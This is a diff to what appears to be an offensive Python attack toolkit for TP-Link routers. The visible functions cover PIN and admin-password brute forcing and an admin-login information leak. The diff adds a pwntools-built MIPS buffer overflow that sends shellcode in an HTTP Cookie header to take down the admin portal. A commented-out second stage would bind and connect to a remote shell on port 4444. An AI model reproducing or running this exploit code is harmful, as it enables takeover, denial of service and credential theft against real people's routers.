@@ -4,6 +4,7 @@ import hashlib
 import base64 
 import urllib.parse
 import requests
+from pwn import *
 
 #Attack 1 - SSID PIN Brute Force
 def ssid_authentication(ssid: str, pin: str) -> bool:
@@ -53,10 +54,12 @@ def query_admin_status(target_url: str)-> None:
     try:
         response = requests.get(target_url)
         if response.status_code == 200:
-            if "The router allows only one administrator to login at the same time, please try again later." in response.text:
-                print(f"[+] Information Disclosure: Admin user is currently logged into the TP-Link")
+            normalized_html = "".join(response.text.split())
+            
+            if "httpAutErrorArray=newArray(0," in normalized_html:
+                print("[+] Information Disclosure: Admin user is currently logged into the TP-Link")
             else:
-                print(f"[-] Admin user is not logged into the TP-Link, try again later...")
+                print("[-] Admin user is not logged into the TP-Link.")
     except requests.exceptions.RequestException as e:
         print(f"[!] Connection error: {e}")
     
@@ -99,6 +102,63 @@ def brute_force_login(target_url: str, password_list: list)->None:
         token = generate_tp_link_auth_token(password)
         if attempt_admin_login(target_url, token):
             print(f"[+] Successfully authenticated as Admin with password: [{password}] at: {target_url}.")
-            return
+            return password
         else:
             print(f"[-] Authentication unsuccessful with password: [{password}], trying next password")
+
+#Attack 4 Denial of Service
+
+def get_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        return s.getsockname()[0]
+    finally:
+        s.close()
+
+def dos_admin_portal(target_url: str):
+    context(arch='mips', endian='big', os='linux')
+
+    io = remote(target_url, 80)
+
+    nop = asm("addiu $a0, $a0, 0x4141")
+    ra_addr = 0x7cfffa90
+    avoid = b'\x00\x0a\x0d' + string.ascii_lowercase.encode()
+
+    read_shell  = asm(shellcraft.findpeer(io.lport))
+    read_shell += asm(shellcraft.read('$s0', ra_addr, 0x200))
+    read_shell += asm(f"""
+        lui $t9, {ra_addr >> 16}
+        ori $t9, $t9, {ra_addr & 0xffff}
+        jalr $t9
+        addiu $a0, $a0, 0x4141
+    """)
+
+    payload  = b"F" * 16
+    payload += p32(ra_addr)
+    payload += nop * 100
+    payload += read_shell
+
+    assert all(c not in avoid for c in read_shell)
+
+    # Construct HTTP GET request with headers
+    request  = b"GET /loginFs/passwd HTTP/1.1\r\n"
+    request += f"Host: {target_url}\r\n".encode()
+    request += f"Referer: http://{target_url}/\r\n".encode()
+    request += b"Cookie: "+payload+b"\r\n"
+    request += b"Upgrade-Insecure-Requests: 1\r\n"
+    request += b"\r\n"
+
+    io.send(request)
+    '''
+    pause()
+
+    # stage 2
+    shell = asm(shellcraft.bindsh(4444))
+    io.send(shell)
+    io.interactive()
+    ip = get_ip()
+    sh1 = remote(ip, 4444)
+    sh1.interactive()
+    '''
+    print(f"[+] The Admin Portal has been successfully taken down!")
